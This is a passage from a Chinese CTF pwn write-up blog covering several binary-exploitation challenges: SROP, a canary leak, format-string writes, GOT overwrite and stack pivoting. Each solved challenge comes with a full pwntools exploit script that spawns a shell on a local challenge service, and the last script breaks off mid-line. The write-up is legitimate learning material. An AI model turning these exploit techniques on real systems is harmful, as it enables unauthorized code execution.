class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./return15&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">39743</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>bin_sh =  <span class="hljs-number">0x0402008</span><br>syscall = <span class="hljs-number">0x000000000040111c</span><br>sigret = <span class="hljs-number">0x40110A</span><br><br>frame = <span class="hljs-title class_">SigreturnFrame</span>()<br>frame.rax = constants.SYS_execve<br>frame.rdi = bin_sh<br>frame.rsi = <span class="hljs-number">0</span> <br>frame.rdx = <span class="hljs-number">0</span> <br>frame.rip = syscall<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x28</span> + p64(sigret) + p64(syscall) + bytes(frame)<br>sd(payload)<br><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="19-VisibleInput"><a href="#19-VisibleInput" class="headerlink" title="19 VisibleInput"></a>19 <strong>VisibleInput</strong></h4><p>写shellcode并执行，但是有了检测，这些机器码要变通着来。（其实就是要用可见字符写shellcode）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211723129.png" alt="image-20240921172341054"></p><p>搓64位shellcode，下载了alpha3，但是运行报错。</p><p>试了好多种工具，都在运行的时候报错，放弃挣扎</p><h4 id="20-system-not-found"><a href="#20-system-not-found" class="headerlink" title="20  system_not_found"></a>20  system_not_found</h4><p>可以覆盖nbytes使得第二次输入栈溢出，结果pop链里没有pop|rdi，不过还好出题人给了libc文件，改libc从本地环境里找偏移。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221643880.png" alt="image-20240922164339686"></p><p>这里注意到%s，%s不是第三层嘛，然后看了看以前的输出，发现从寄存器输出要比栈输出少一层。如果是%p的话，寄存器直接把值输出，栈是第二层。（想着用%s输出的做法被打消了。。）</p><p>红框分别代表一层</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221720115.png" alt="image-20240922172024046"></p><p>0只会把最后一个字节置为0，地址的话没有影响（因为本身就输入了0）</p><p>注意到这里的参数跟rbp有关，pop链里有pop rbp，那把rbp改了就可以输出值了。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221737200.png" alt="image-20240922173710140"></p><p>这样子可以输出libc真实地址，但是就不能后续就不能正常输入了。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409221740725.png" alt="image-20240922174012690"></p><p>那换个思路，给后面的printf换成one_gad_get不久好了，不过还得再算算到哪儿可以正常往里读入。</p><p>v6是rbp-0x28</p><p>buf是rbp-0x40</p><p>找偏移中，如果直接跟基地址减的话，发现偏移不一致（取得不是直接函数里的，因为距离不够）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222126301.png" alt="image-20240922212630221"></p><p>除去0之后都是差0x300000（有时候是0x200000.。。。。）</p><p>经多次检验后正常，准备尝试改got表打onegadget</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222206631.png"></p><p>这是onegadget的条件，好多要求可写。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222217920.png" alt="image-20240922221747874"></p><p>这里可以看到ret回的地方是这里</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222213767.png" alt="image-20240922221345723"></p><p>本来想凑凑第二个，结果突然发现rbp已经是0了，第一个更好凑。</p><p>想要溢出到这里，但是后面还有printf，这里保护了printf正常执行，但printf执行的过程中卡死了。。看看提示去</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222237799.png" alt="image-20240922223717209"></p><p>没啥子用。。。不对，第二个有用！</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222238308.png" alt="image-20240922223841272"></p><p>rdi里的值可以直接输出得到libc地址，不用绕这么多圈去从bss打印。。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409222241496.png" alt="image-20240922224152445"></p><p>阿里嘎多提示酱，我真真真不会注意这种地方，绕了大圈子。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./dialogue&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46211</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>puts_plt = <span class="hljs-number">0x401040</span><br>main_addr = <span class="hljs-number">0x04011E1</span><br>bss_got = <span class="hljs-number">0x403FF0</span> + <span class="hljs-number">0x40</span><br>pop_rbp = <span class="hljs-number">0x000000000040115d</span><br>pop_ret = <span class="hljs-number">0x000000000040101a</span><br>payload = p64(bss_got)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x200</span>)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>rl()<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x30</span>+p64(puts_plt)+p64(main_addr)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>recv_addr = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(recv_addr))<br>libc_base = recv_addr - (<span class="hljs-number">0x7fbf12662050</span> - <span class="hljs-number">0x7fbf12600000</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">print(libc.sym[&#x27;puts&#x27;])</span><br><span class="hljs-string">libc_base = recv_addr &amp; 0xfffffff00000 </span><br><span class="hljs-string">libc_base = libc_base - 0x300000</span><br><span class="hljs-string">print(hex(libc_base))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>printf_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0x50a47</span><br>pop_rcx = <span class="hljs-number">0x000000000003d1ee</span> + libc_base<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">payload = p64(puts_addr)+p64(printf_addr)+p64(one_gadget)*4+p64(pop_rcx)+p64(0)+p64(main_addr)</span><br><span class="hljs-string">sd(payload)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = p64(bss_got)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x200</span>)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>rl()<br>payload = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x30</span>+p64(one_gadget)<br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="21-read-once-twice"><a href="#21-read-once-twice" class="headerlink" title="21 read_once_twice"></a>21 read_once_twice</h4><p>保护全开，<del>格式化字符串漏洞</del>，栈溢出，有后门。</p><p>调试看距离太没挑战性了，直接来一波手算(也没啥挑战性，回顾一下计算)</p><p>canary的距离：(0x20-0x8)&#x2F;0x8+5&#x3D;8</p><p>ret到的main（0x1302）:8+2&#x3D;10</p><p>（嘶看错了，是puts不是printf…莫得格式化字符串）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231721115.png" alt="image-20240923172144970"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231723508.png" alt="image-20240923172349442"></p><p>vuln后返回的地址</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231724679.png" alt="image-20240923172434575"></p><p>第一次泄露canary，第二次覆盖返回地址后三位为main的开始就可以二次打。（因为后3位相同），不过发现后门的第一位也是1，跟main相同，直接覆盖到后门就行了。不对，一次只能覆盖四位。。。那就一直爆最后一位。（该exp就是不断手动尝试执行，直到刚好倒数第4位对应的偏移为0是成功）</p><p>exp：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./twice&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46285</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x11AA</span><br><br>payload = b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>)+b<span class="hljs-string">&#x27;B&#x27;</span><br>sd(payload)<br>ru(<span class="hljs-string">&#x27;AB&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))*<span class="hljs-number">0x100</span><br>print(hex(canary))<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>)+p64(canary)*<span class="hljs-number">2</span>+p16(back_addr)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="22-where-is-fmt"><a href="#22-where-is-fmt" class="headerlink" title="22 where is  fmt"></a>22 where is  fmt</h4><p>非栈上格式化字符串修改返回地址</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241304481.png" alt="image-20240924130451316"></p><p>先泄露栈地址</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241305339.png" alt="image-20240924130506293"></p><p>再找到可以利用的链</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241317602.png" alt="image-20240924131709522"></p><p>stack1偏移为8</p><p>stack2偏移为15</p><p>stack3偏移为33（x）这里不是十进制数啊。。。0x27&#x3D;39,39+6&#x3D;45</p><p>结束。。。还以为那里的变量不能动来着，结果是算错了这种低级错误。。。</p><p>exp:</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./wherefmt&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,35513)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>back_addr = 0x401202<br><br>payload = b&#x27;%8$p&#x27;<br><br>sd(payload)<br><br>ru(b&#x27;0x&#x27;)<br>stack1_addr = int(rc(12),16)-0x8<br>print(hex(stack1_addr))<br>stack2_addr = stack1_addr + 0x30<br>stack3_addr = stack1_addr + 0x120<br>stack_num = stack1_addr - 0x10 +5<br>offset = stack1_addr &amp; 0xffff<br>payload = &#x27;%&#x27; + str(offset) + &#x27;c&#x27; +&#x27;%15$hn&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-variable">payload</span>)</span><br>sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><br>payload = &#x27;%2c%45$hhn\x00&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="23-got-it"><a href="#23-got-it" class="headerlink" title="23 got it"></a>23 got it</h4><p>保护近乎于全开</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242146176.png" alt="image-20240924214624115"></p><p>bss段上又16个saves，每个8字节，可以选择对里面的一个saves加减乘除，也可以全部打印</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242152752.png" alt="image-20240924215223707"></p><p>（可以用负数选择对saves以外的地址进行操作，但是不能进行直接打印）</p><p>实在想不出来怎么用，提示，启动；欸？已知的知识点啊。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242204889.png" alt="image-20240924220455842"></p><p>等等，puts这里打印出了b，也就是说，，，，也可以是bin_sh？</p><p>喵喵喵，感谢提示</p><p>emm这样子打印不出来，得写到一起。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242219067.png" alt="image-20240924221921031"></p><p>注意要小端序</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242225620.png" alt="image-20240924222519585"></p><p>saves与puts的距离：0x80</p><p>0x80&#x2F;8&#x3D;16</p><p>原本想着-16为啥不行，动调发现rax结果很奇怪，奥，%u，无符号数。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242300702.png" alt="image-20240924230012647"></p><p>真正输入-16之后，在*8后不为真正的数值，暂时陷入未知，写个c看看</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251329369.png" alt="image-20240925132933235"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251330705.png" alt="image-20240925133056672"></p><p>这里可以看到，-128被作为了0xffffff80</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251333138.png" alt="image-20240925133339075"></p><p>但是，奇奇怪怪。。。输出rax的结果与输出单纯值的结果会不同。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251345608.png" alt="image-20240925134519563"></p><p>但是这样子就可以看到-16了</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251356927.png" alt="image-20240925135645893"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251405976.png" alt="image-20240925140543938"></p><p>看样子应该是符号扩展的问题</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251405873.png" alt="image-20240925140532813"></p><p>但是v1只有4个字节，无法把高位扩展到。。</p><p>不对，扩展不会只扩展这么少，应该是相乘后就是这个值。</p><p>那直接使得相乘后是这个值呢</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251619894.png" alt="image-20240925161900785"></p><p>还是不行，就得是</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251623048.png" alt="image-20240925162331012"></p><p>欸，只想着往上扩展，可以往下越界，从正数越界多好越啊，越到now_saves，然后改不就得了。。。。光想着负数溢出了，还有正数的越界啊，又被固有思维限制了。。</p><p>直接越界到now_save，自己指向自己，相减修改到puts_got的位置，再减去对应的偏移。</p><p>注意，写bin_sh写习惯了，实际是&#x2F;bin&#x2F;sh，或者直接sh就好。。。</p><p>exp:</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./gotit&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,33571)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>def numbers(nums,times):<br>    rl()<br>    nums = str(ord(nums))<br>    sl(b&#x27;1&#x27;)<br>    rl()<br>    sl(times)<br>    rl()<br>    sl(b&#x27;1&#x27;)<br>    sl(nums)<br>    sl(b&#x27;5&#x27;)<br><br>&#x27;&#x27;&#x27;<br>numbers(&#x27;b&#x27;,&#x27;0&#x27;)<br>numbers(&#x27;i&#x27;,&#x27;1&#x27;)<br>numbers(&#x27;n&#x27;,&#x27;2&#x27;)<br>numbers(&#x27;_&#x27;,&#x27;3&#x27;)<br>numbers(&#x27;s&#x27;,&#x27;4&#x27;)<br>numbers(&#x27;h&#x27;,&#x27;5&#x27;)<br>&#x27;&#x27;&#x27;<br><br><br>rl()<br>sl(b&#x27;1&#x27;)<br>rl()<br>sl(&#x27;0&#x27;)<br>rl()<br>sl(b&#x27;1&#x27;)<br><br>strs=int(&#x27;0x6873&#x27;,16)<br>print(strs)<br>sl(str(strs))<br>sl(b&#x27;5&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><br>rl()<br>sl(b&#x27;1&#x27;)<br>rl()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *$rebase(0x12bd)&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>sl(&#x27;16&#x27;)<br><br><br>rl()<br>sl(b&#x27;2&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>offset = 0x100<br>sl(str(offset))<br>sl(b&#x27;2&#x27;)<br><br>offset = libc.sym[&#x27;puts&#x27;]-libc.sym[&#x27;system&#x27;]<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-keyword">str</span><span class="hljs-params">(<span class="hljs-variable">libc</span>.<span class="hljs-variable">sym</span>[&#x27;<span class="hljs-variable">puts</span>&#x27;])</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-keyword">str</span><span class="hljs-params">(<span class="hljs-variable">libc</span>.<span class="hljs-variable">sym</span>[&#x27;<span class="hljs-variable">system</span>&#x27;])</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *$rebase(0x0125c)&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>sl(str(offset))<br>sl(b&#x27;5&#x27;)<br><br>sl(b&#x27;3&#x27;)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="24-栈的奇妙之旅"><a href="#24-栈的奇妙之旅" class="headerlink" title="24 栈的奇妙之旅"></a>24 栈的奇妙之旅</h4><p>16字节你能秒我？一眼栈迁移</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251710944.png" alt="image-20240925171041856"></p><p>没有输出的途径，没有栈地址，只能往bss上迁移。</p><p>注意不能重复在一段上写，否则造成rsp与写的位置重复后，ret到不该ret的位置。</p><p>由于之前是相差0x80，这里手动调整每次rbp-0x80</p><p>好久没打栈迁移了，有些生疏了。。。最后注意栈对齐</p><p>exp：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./travelstack&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,43151)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>vuln_addr = 0x4011e5<br>puts_plt = 0x0401060<br>puts_got = 0x403FD8<br>pop_ret = 0x000000000040101a<br>pop_rdi = 0x4011c5<br>leave_ret = 0x4011FC<br>bss_addr = 0x404800<br><br>payload = b&#x27;A&#x27; * 0x80 + p64(bss_addr) + p64(vuln_addr) <br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>ru(&#x27;kill&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *0x4011F6&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">(1)</span><br><br>sd(payload)<br><br>payload = p64(bss_addr-0x80) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>payload = payload.ljust(0x80,b&#x27;A&#x27;)<br>payload += p64(bss_addr - 0x80) + p64(leave_ret)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *0x4011F6&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">(1)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">ru</span><span class="hljs-params">(&#x27;<span class="hljs-variable">kill</span>&#x27;)</span><br>sd(payload)<br>puts_addr = u64(ru(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts_addr))<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>bin_sh = libc_base + next(libc.search(&#x27;/bin/sh&#x27;))<br>system_addr = libc_base + libc.sym[&#x27;system&#x27;]<br><br>payload = p64(bss_addr-0x80) +p64(pop_ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(vuln_addr)<br>payload = payload.ljust(0x80,b&#x27;A&#x27;)<br>payload += p64(bss_addr - 0x80*2) + 